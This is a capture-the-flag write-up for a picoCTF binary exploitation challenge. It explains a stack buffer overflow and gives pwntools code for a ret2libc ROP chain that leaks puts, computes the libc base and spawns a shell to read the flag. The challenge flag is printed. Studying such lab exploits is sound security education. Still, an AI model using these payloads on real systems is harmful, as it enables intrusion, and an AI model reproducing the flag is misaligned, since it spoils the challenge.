# Solution

## Looking at the program

Ok, let's start by looking at the security of this executable:

```bash
$ pwn checksec vuln
[*] '/home/kris/Downloads/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

No stack canary. (awwesome!)

Not PIE, PIE stands for Position Independent Executable, a PIE binary would have its depencies loaded into random locations making ROP chains really hard to create.

Then I tried running it

```bash
$ ./vuln
WeLcOmE To mY EcHo sErVeR!
echo!
EcHo!
test!!
TeSt!!
%s
%s
```

So after it says "WeLcOmE To mY EcHo sErVeR!", whatever I put it, it echoes it back with random capitalization. 

## Finding a vulnerability

One of the first things I tried putting in was then "%s" in the hopes of getting a format string vulnerability.

The next thing I check for is a buffer overflow, so I soon typed in lots of a's to see if it would crash, and would you look at that:

```
$ ./vuln
WeLcOmE To mY EcHo sErVeR!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaaaaaaaaaaaaaaaaaaaaad
Illegal instruction (core dumped)
```

Not only did it seg fault, but it says Illegal instruction. So maybe I overwrote the return address?

By inspecting the file in ghidra we can see that the buffer is of size 112, and by playing around with different "a" lengths, it took 136 a's to cause a seg fault

```
void do_stuff(void)

{
  char cVar1;
  undefined local_89;
  char local_88 [112];			// <--- here's the buffer
  undefined8 local_18;
  ulong local_10;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",local_88);    // <-- buffer overflow here
  __isoc99_scanf("%c",&local_89);
  for (local_10 = 0; local_10 < 100; local_10 = local_10 + 1) {
    cVar1 = convert_case((int)local_88[local_10],local_10);
    local_88[local_10] = cVar1;
  }
  puts(local_88);
  return;
}
```

## Exploiting the vulnerability 

We have found a vulnerability, how tf are we going to exploit it?

Our end goal is to get a shell, we want to pwn the target, the most common (way to do so is to call `execve(/bin/sh)` or `system(/bin/sh)`, I'm going to use `system`.

We need to therefore find where `system` is stored. Searching for it on the executable `vuln` led to no results (because it isn't used in `vuln`) but we can definitely get it from the `libc`library, same applies for the string `/bin/sh`. However, the address of the function on the `libc` library is not the same as when the program is executing. When we execute `vuln` (aka during runtime), it loads the functions of `libc` into memory, where the addresse will no longer be the same. This is covered in the topic of linkers, which I don't know too well, but [this blog](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html) explains what I'm talking about in more detail, on linkers and why shared libraries don't have determined base addresses.


Luckily, notice that the `puts` function is on both vuln and libc, if we can find the address of `puts` during runtime, AND we have the address of `puts` on `libc` we can find what the base address of the libc file is during that. i.e. all the functions in `libc` are loaded into memory at the same offset from eachother, so if we find a base address, we can calculate where `system` is in memory, using the address of `system` on `libc` and the base address during runtime.

We get the address  of `puts` during runtime by using the Global Offset Table (GOT). During runtime, the dynamic linker goes to find where in memory each function is stored, to avoid having the dynamic linker search this up everytime, it stores the address of each function in the GOT. We can extract the address of `puts` on the GOT using pwn tools
```python
from pwn import *

# load the files into pwn's ELF() function
binary = ELF("vuln") # pass in executable
libc = ELF("../libc.so.6") # pass in library


# use ROP() function to find gadgets
rop = ROP(binary)


got_puts_addr = binary.got["puts"]
```
but we need to print the value stored there to get the address of `puts` during runtime.

We utilize the procedure linkage table (PLT) to call `puts` to print the address stored on the GOT.
```python
plt_puts_addr = binary.plt["puts"]
```

To repeat, we get our GOT address using `binary.got["puts"]` we are looking at the static file `vuln`, it's different during runtime, the dynamic linker will fetch the `puts` address in memory for us and store it at `binary.got["puts"]`, therefore printing whatever's there will give us the address.

Ok! How do we print the address of `puts`? I mentioned that we call `puts` to print it out, but how do we even do that? 

We're creating something called a ROP chain. Consider the stack, it's storing the return address, local variables and stuff. When we do our buffer overflow, we're overflowing our buffer into the stack (stack smashing!), and what we can do is we can overwrite the return address and make the program go wherever we want. Our goal is to make it print `binary.got["puts"]`, there's a lot of steps to that though, we need to load `binary.got["puts"]` into the `rdi` register, and then call `puts`. There's no code on `vuln` that allows us to directly do that. However, there IS code that just pops `rdi` and then returns, we call that an rdi gadget (I think that's the convention). We can find this in `vuln`, either by looking directly at the assembly, or by using pwntools to help us out.

```
pop_rdi_addr = rop.rdi.address
```

This gives us the address of `pop rdi; ret` somewhere in `vuln`. So this'll pop whatever's next on the stack into `rdi`, which means we have to put `binary.got["puts"]` into the stack next. After that, we want to go back to main so that we input stuff again. (Otherwise the program just exits or crashes and we can't do anything)

```python
# can use .symbols to get main function address
main_addr = binary.symbols["main"]

# program will pop got_puts_addr into rdi, then call
# plt_puts_addr, since got_puts_addr is in rdi
# the program will print the location of got_puts_addr
# then we make it go back to main
payload = b"A" * 136 + p64(pop_rdi_addr) + p64(got_puts_addr) + p64(plt_puts_addr) + p64(main_addr)

```

We need the A's in the payload to overflow the buffer, then `p64()` just converts it into pointers.

With this, we send our payload!

```python
# connect
p = remote("mercury.picoctf.net",1774)

# receive text up until we can input stuff
p.recvuntil(b"VeR!\n")

# send payload
p.sendline(payload)
```

Next we get our runtime address and calculate the base address of libc's function in memory

```python
# receive the AAAA's we sent
print(p.recvline())


# receive the runtime address of puts
# we need to cut out the \n also
leaked_addr = p.recvline().strip(b"\n")
# convert it into the right format
leaked_addr = int.from_bytes(leaked_addr, byteorder = "little")

libc_puts_addr = libc.symbols["puts"]

libc_base_addr = leaked_addr - libc_puts_addr
```

Recall that the libc functions loaded into memory are at the same offsets, so we use this base address to find the other functions and strings. We utilize pwntools to save us time.

```
bin_sh_addr = next(libc.search(b"/bin/sh\x00")) + libc_base_addr
system_addr = libc.symbols["system"]            + libc_base_addr
```

With this we craft our next ROP chain. I'll show you a ROP chian that does NOT work

```python
# this line below won't work, because we need the stack to be aligned
# some 64-bit systems need the stack to be 16-byte aligned  
# i.e. address of $rsp ends with 0 address
payload = b"A" * 136 + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
```

The comment already explains why. So to align the stack, I just call `ret`.

```python
# but I like this solution more
payload = b"A" * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr)  + p64(system_addr)
```

Once we send that, we just go interactive and then print the flag!

```python
print(p.recvuntil(b"VeR!\n"))

p.sendline(payload)

p.interactive()

```bash
[*] Switching to interactive mode
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_f2ac531bbb3a68ed}$ 
```

And we get our flag.
`picoCTF{1_<3_sm4sh_st4cking_f2ac531bbb3a68ed}`

Also need to give credit to writeups that I read to help polish mine:
https://www.youtube.com/watch?v=hlHHiWoZKbs&lc=Ugy_3z4h0JfhuofZ7e14AaABAg
https://cyb3rwhitesnake.medium.com/picoctf-heres-a-libc-pwn-4184a99586d9
